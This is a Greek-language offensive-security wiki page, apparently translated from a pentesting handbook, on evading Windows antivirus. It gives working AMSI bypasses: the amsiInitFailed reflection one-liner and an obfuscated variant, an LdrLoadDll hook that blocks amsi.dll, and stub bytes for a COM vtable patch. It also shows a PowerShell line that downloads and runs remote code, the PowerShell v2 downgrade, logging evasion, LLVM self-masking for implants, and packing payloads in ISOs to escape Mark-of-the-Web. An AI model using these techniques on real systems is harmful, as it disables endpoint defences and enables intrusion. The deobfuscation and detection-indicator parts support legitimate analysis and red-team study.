Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία των Windows.

- Έλεγχος λογαριασμού χρήστη (User Account Control ή UAC): ανύψωση δικαιωμάτων κατά την εγκατάσταση EXE, COM, MSI ή ActiveX
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (`wscript.exe` και `cscript.exe`)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή που είναι μη κρυπτογραφημένη και μη συσκοτισμένη.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει το `amsi:` και έπειτα τη διαδρομή προς το εκτελέσιμο αρχείο από το οποίο εκτελέστηκε το script — σε αυτήν την περίπτωση, το powershell.exe.

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από το **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη φόρτωση κώδικα στη μνήμη μέσω του `Assembly.Load(byte[])`. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής του εντοπισμού.

Ωστόσο, το AMSI έχει τη δυνατότητα να αποσυσκοτίζει scripts ακόμη κι αν έχουν πολλά επίπεδα, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο εφαρμογής του. Αυτό σημαίνει ότι η αποφυγή του εντοπισμού δεν είναι απλή υπόθεση. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών, οπότε εξαρτάται από το πόσο έντονα έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται φορτώνοντας ένα DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να παραποιηθεί, ακόμη και από μη προνομιούχο χρήστη. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους αποφυγής της σάρωσης AMSI.

**Εξαναγκασμός σφάλματος**

Ο εξαναγκασμός αποτυχίας της αρχικοποίησης του AMSI (`amsiInitFailed`) έχει ως αποτέλεσμα να μη ξεκινά καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), ενώ η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη λειτουργικό στην τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Να έχετε υπόψη ότι αυτή η ανάρτηση πιθανότατα θα επισημανθεί μόλις δημοσιευτεί, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν σκοπεύετε να παραμείνετε μη ανιχνεύσιμοι.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Έτσι, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές παράκαμψης του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

### Ανακατεύθυνση του δείκτη σάρωσης AMSI COM αντί για patching του `AmsiScanBuffer`

Μια άλλη παράκαμψη, τοπική στη διεργασία, αφήνει ανέπαφο το σημείο εισόδου `AmsiScanBuffer`. Στον αναφερόμενο 64-bit .NET loader, δημιουργείται ένα αντικείμενο AMSI COM από το CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`. Η `Marshal.GetIUnknownForObject()` επιστρέφει τον δείκτη διεπαφής και η θέση της vtable με offset `0x18` χρησιμοποιείται ως στόχος της κλήσης σάρωσης. Ο loader κάνει patch σε έναν native pointer της `Console.Clear()` με ένα μικρό x64 stub, αλλάζει αυτήν την καταχώριση της vtable προς το stub μέσω της `VirtualProtect()` και, στη συνέχεια, επαναφέρει την αρχική προστασία της σελίδας. Προϋποθέσεις είναι τόσο το πλάτος δείκτη των 64 bit όσο και η αναμενόμενη διάταξη COM· αυτό δεν αποτελεί γενικό offset για αυθαίρετες διεπαφές ή εκδόσεις του AMSI. Τα προηγούμενα στάδια που παρατηρήθηκαν είναι η [φόρτωση signed AppDomainManager sidecar](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) και η [αποσειριοποίηση RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Τα παρατηρημένα bytes του stub είναι `41 C7 00 01 00 00 00 33 C0 C3`: γράφουν **1** στον δείκτη αποτελέσματος στο `r8` και επιστρέφουν **0** στο `eax`. Επομένως, ο αναφερόμενος ισχυρισμός ότι το αποτέλεσμα της σάρωσης είναι `AMSI_RESULT_CLEAN` (0) συγχέει την τιμή επιστροφής `S_OK` με το enum εξόδου. Στην τεκμηριωμένη σειρά του `AMSI_RESULT`, το αποτέλεσμα **1** είναι `AMSI_RESULT_NOT_DETECTED`· εξακολουθεί να βρίσκεται κάτω από το όριο ανίχνευσης.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Αποκλεισμός του AMSI αποτρέποντας τη φόρτωση του amsi.dll (hook στο LdrLoadDll)

Το AMSI αρχικοποιείται μόνο μετά τη φόρτωση του `amsi.dll` στην τρέχουσα διεργασία. Μια ισχυρή παράκαμψη, ανεξάρτητη από τη γλώσσα, είναι η τοποθέτηση ενός hook σε user mode στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν εκτελούνται σαρώσεις σε αυτήν τη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και custom loaders (με οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με αποστολή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), ώστε να αποφεύγονται τα μεγάλα artefacts στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, το οποίο αποφεύγει τον εντοπισμό από signatures χρησιμοποιώντας τυχαιοποιημένες user-defined functions, μεταβλητές και εκφράσεις χαρακτήρων, και εφαρμόζει τυχαία κεφαλαιοποίηση χαρακτήρων στις λέξεις-κλειδιά του PowerShell, ώστε να αποφεύγει τον εντοπισμό από signatures.

**Αφαιρέστε το signature που εντοπίστηκε**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, για να αφαιρέσετε από τη μνήμη της τρέχουσας διεργασίας το signature του AMSI που εντοπίστηκε. Το εργαλείο σαρώνει τη μνήμη της τρέχουσας διεργασίας για το signature του AMSI και έπειτα το αντικαθιστά με εντολές NOP, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε την έκδοση 2 του PowerShell**
Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή PowerShell είναι μια λειτουργία που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελεί **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Για αυτόν τον σκοπό, μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Χρήση της έκδοσης 2 του Powershell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση unmanaged PowerShell session**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (την προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει ελέγχους που συνδέονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί από μόνο του το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ενδεχομένως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Απο-αποκρυπτογράφηση .NET Binaries που έχουν προστατευτεί με ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντάτε πολλά επίπεδα προστασίας που εμποδίζουν τη λειτουργία decompilers και sandboxes. Η παρακάτω ροή εργασιών **αποκαθιστά αξιόπιστα ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο μπορεί στη συνέχεια να μετατραπεί σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση του anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Επίσης, τροποποιεί το PE checksum, ώστε οποιαδήποτε αλλαγή να προκαλέσει crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα κλειδιά XOR και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Το Output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να φανούν χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / control-flow – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα fork του de4dot που υποστηρίζει το ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – επιλέξτε το profile ConfuserEx 2
     • Το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, τις classes και τα ονόματα των μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy-call – Το ConfuserEx αντικαθιστά τις απευθείας κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω την αποσυμπίληση. Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως τα `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά, το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειαστεί να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα προσαρμοσμένο attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μία γραμμή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), που να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από αλλοίωση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για την παραγωγή obfuscated κώδικα κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο από obfuscated λειτουργίες, που δημιουργούνται από το framework template metaprogramming της C++, δυσκολεύοντας λίγο περισσότερο τη ζωή όποιου θέλει να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα PE αρχεία, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα αρχεία.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework για λεπτομερή code obfuscation σε γλώσσες που υποστηρίζονται από το LLVM, χρησιμοποιώντας ROP (return-oriented programming). Κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code μετατρέποντας κανονικές εντολές σε ROP chains, αποτρέποντας τη φυσική μας αντίληψη για τη συνηθισμένη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### LLVM compiler-assisted per-function self-masking

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όσο βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες συναρτήσεις XOR-masked όταν δεν είναι ενεργές. Το PoC Function Peekaboo επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό machine code και εκπέμπει έναν κοινό handler masking στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η Windows x64 calling convention παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Αυτό πρέπει να γίνει μετά την επιλογή εντολών και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε εκπεμπόμενο return** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο επισυναπτόμενο epilogue και αντικαθιστά τα προηγούμενα returns με `JMP_1 handler`. Διατηρήστε οποιοδήποτε compiler-generated teardown της στοίβας/frame προηγείται κάθε return· ανακατευθύνετε μόνο την ίδια την εντολή return.<sup>[[38]](#references)[[39]](#references)</sup>

Τα `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ το `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που μοιράζονται τα στάδια εκπομπής επιτρέπουν σε έναν κλάδο του prologue να στοχεύει το epilogue που θα εκπεμφθεί αργότερα· για ένα near `je` που εκπέμπεται χειροκίνητα, γράψτε `0F 84` ακολουθούμενο από την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα άλματα προς τον handler μπορούν εναλλακτικά να εκπεμφθούν ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση, όταν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα κλειδί XOR και εγγραφές 16 byte, που περιέχουν έναν loader-relocated δείκτη συνάρτησης και ένα μήκος χρόνου εκτέλεσης, στο `.funcmeta`. Παρόλο που το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στο offset `+8` της εγγραφής, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα των PE section έχουν μήκος μόνο οκτώ byte, οπότε η αναζήτηση χρόνου εκτέλεσης βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό RVA του entry point στο stub και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub λαμβάνει τη βάση του image από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα PE32+ imports για να εντοπίσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση των metadata. Το μόνιμα αναγνώσιμο prologue καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παρακάμπτει το σώμα που παραμένει ακόμη clear. Στη συνέχεια, το epilogue χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` bytes), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata. Το stub καθαρίζει το sentinel και, αφού γίνει masking σε όλα τα σώματα, κάνει άλμα στη διεύθυνση `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη συνηθισμένη κλήση, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στο επισυναπτόμενο epilogue, ενώ κάθε προηγούμενο return κάνει άλμα κατευθείαν στον κοινό handler. Το συνηθισμένο epilogue χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε μετά το re-masking, το `ret` του handler να καταναλώσει τη διεύθυνση επιστροφής του αρχικού caller και να διατηρήσει το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παρακάμπτει το σταθερού μήκους ορατό prologue (`0x46` bytes σε αυτό το build), αλλάζει το υπόλοιπο σε `PAGE_EXECUTE_READWRITE`, εφαρμόζει XOR byte προς byte χρησιμοποιώντας το χαμηλό byte του κλειδιού και, στη συνέχεια, το ορίζει σε `PAGE_EXECUTE_READ`. Συνεπώς, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά κάθε κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Οι ισχυρές ενδείξεις για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και ένα section `.funcmet` που περιέχει κλειδί μαζί με relocated δείκτες προς το `.text`,
- parsing των PEB, import table και section table πριν από το CRT, ακολουθούμενο από κλήσεις μέσω κάθε δείκτη των metadata,
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά return sites που ανακατευθύνονται σε έναν handler,
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες αλλαγές προστασίας μέσω `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από το image.

Αυτό είναι αποφυγή memory scanner, όχι κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό clear σώμα, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, τα αναγνώσιμα metadata και το σταθερό όριο `0x46` καθιστούν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα TEB slots του PoC είναι thread-local, αλλά οι τροποποιημένες σελίδες κώδικα είναι process-wide. Επομένως, η ταυτόχρονη ή αναδρομική είσοδος μπορεί να αλλάξει ξανά την κατάσταση των εντολών ενώ μια άλλη κλήση εκτελείται· οι εξαιρέσεις και οι μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις αλλαγές, να επαναφέρει την προστασία που επιστράφηκε μέσω του `lpflOldProtect`, να αποφεύγει τα hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` ως προς την ευθυγράμμιση της στοίβας x64 και να καλεί το `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων bytes. Η Microsoft καθιστά ρητά τον caller υπεύθυνο για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτήν την οθόνη κατά τη λήψη ορισμένων εκτελέσιμων αρχείων από το internet και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη. Αυτό σημαίνει ότι εφαρμογές που δεν κατεβαίνουν συχνά ενεργοποιούν το SmartScreen, προειδοποιώντας έτσι και αποτρέποντας τον τελικό χρήστη από την εκτέλεση του αρχείου (αν και μπορεί να εκτελέσει το αρχείο κάνοντας κλικ στα More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το internet, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για αρχείο που λήφθηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία που έχουν υπογραφεί με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να μην αποκτήσουν τα payloads σας το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου, ώστε να παρακάμπτεται το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

